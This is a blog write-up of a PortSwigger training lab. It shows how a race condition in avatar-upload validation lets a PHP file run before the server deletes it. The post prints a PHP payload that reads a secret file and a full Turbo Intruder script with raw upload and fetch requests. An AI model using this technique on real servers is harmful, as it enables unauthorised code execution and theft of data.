---
id: "web-shell-upload-via-race-condition"
title: "Web shell upload via race condition - PortSwigger Write Up"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-23
updatedDate: 2024-10-13
image: "https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-0.webp"
description: "Learn to exploit race condition vulnerabilities in file uploads to execute malicious PHP code before the server applies security validations."
categories:
  - "portswigger-labs"
draft: false
featured: false
lang: "en"
---

In this post, we'll be solving the PortSwigger lab: "Web shell upload via race condition".

![PortSwigger lab home page](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-1.avif)

To solve the lab, we need to upload a PHP file that reads and displays the contents of the `/home/carlos/secret` file. Since to demonstrate that we've completed the lab, we must submit the contents of this file.

Additionally, the server has strong defenses against malicious file uploads, so we'll need to exploit a race condition.

In this case, the lab itself provides us with an account to log in, so let's do that:

![Login form](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-2.avif)

![Provided access credentials](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-3.avif)

Once we've logged in, we're presented with the account profile:

![User profile](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-4.avif)

As we can see, we have an option to upload files, specifically it appears to be for updating the profile avatar. Let's try to take advantage of this option to upload the following PHP file:

![PHP code to read the secret file](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-5.avif)

First, let's prepare Burp Suite to intercept the request:

![Browser proxy configuration](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-6.avif)

![Activating interception in Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-7.avif)

Once we have Burp Suite ready along with the proxy, we select the file and click "Upload":

![File selection for upload](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-8.avif)

![Confirmation of selected file](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-9.avif)

![Processing file upload](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-10.avif)

Here Burp Suite will intercept the file upload request:

![Intercepted request in Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-11.avif)

Having the request, let's move it to the repeater to see the server's response:

![Server response showing restriction](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-12.avif)

As we can see, it indicates that it only allows JPG and PNG files. Additionally, the lab indicated that there's a strong defense on the server side, so it doesn't look like any of the methods seen in the other labs will work.

In this case, what we're going to exploit is a race condition. This basically consists of the fact that when we send a file that the server doesn't allow, when we send it, this file is actually uploaded to the server, but milliseconds later, the server compares the file with the configured sanitizations, and if it doesn't meet any of them, it deletes it. But for a brief period of time, this file remains uploaded on the server.

To exploit this, we're going to use the "Turbo Intruder" extension. We can install it from Burp Suite itself:

![Installing the Turbo Intruder extension](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-13.avif)

Once installed, we go to the request we had intercepted and sent to the repeater and right-click to send it to turbo intruder:

![Sending request to Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-14.avif)

A tab like the following will open:

![Turbo Intruder interface](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-15.avif)

Basically in the upper part we have our request, and in the lower part, we have so to speak the programming of what we want the extension to do.

The idea is going to be to use the following code, so we delete the entire lower part of the default code and replace it with the following:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''

    request2 = '''<YOUR-GET-REQUEST>'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

![Python code for the Turbo Intruder script](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-16.avif)

The idea is that the extension will make the POST request uploading the PHP file, and immediately, it will make 5 GET requests to the absolute path where the file will be uploaded. In such a way that perhaps we're lucky enough that some of those 5 GET requests are made between the moment when the file has been uploaded and the moment when it has been checked and deleted by the server, in that brief time window.

Understanding this, in the code we just replaced, we're going to place in the `request1` variable the complete POST request, and in the `request2` variable, the complete GET request. We can use the HTTP History to obtain the GET request for example:

![HTTP History in Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-17.avif)

The idea is for the code to look similar to the following:

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Cookie: session=JNvosgi2FoKxUcKBOL4y07fao7UWjLLG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------330791307811450659691420606466
Content-Length: 549
Origin: https://ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Dnt: 1
Referer: https://ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="avatar"; filename="readSecret.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="user"

wiener
-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="csrf"

eNET4DMt9dleHLPIsCZpUeBUCbDs5JQ2
-----------------------------330791307811450659691420606466--

'''

    request2 = '''
GET /files/avatars/readSecret.php HTTP/1.1
Host: ac4b1f5f1e3dd03bc0f834b600e0000b.web-security-academy.net
Cookie: session=JNvosgi2FoKxUcKBOL4y07fao7UWjLLG
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

'''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

With this done, we start the attack by clicking the "Attack" button at the bottom:

![Attack button in Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-18.avif)

![Results of the attack with Turbo Intruder](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-19.avif)

A new window will open where we'll see the different requests, and if we notice out of the 5 GET requests, 3 resulted in a 404 error, however, 2 requests returned 200, so these two requests were made in the brief window we were talking about earlier. At the same time, if we click on one of them, we can see the output of the interpreted PHP code, in other words, the contents of the secret file.

With this, we submit the solution:

![Form to submit the solution](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-20.avif)

![Submitted solution confirmation](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-21.avif)

And this way, we complete the lab:

![Lab completed successfully](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-22.avif)

![Final confirmation message](https://cdn.deephacking.tech/i/posts/portswigger-labs/web-shell-upload-via-race-condition/web-shell-upload-via-race-condition-23.avif)

Links of interest:
- [Race Condition - Hacktricks](https://book.hacktricks.xyz/pentesting-web/race-condition)
- [HackerOne Report 759247](https://hackerone.com/reports/759247)
- [HackerOne Report 55140](https://hackerone.com/reports/55140)
- [Race Conditions Exploring the Possibilities](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
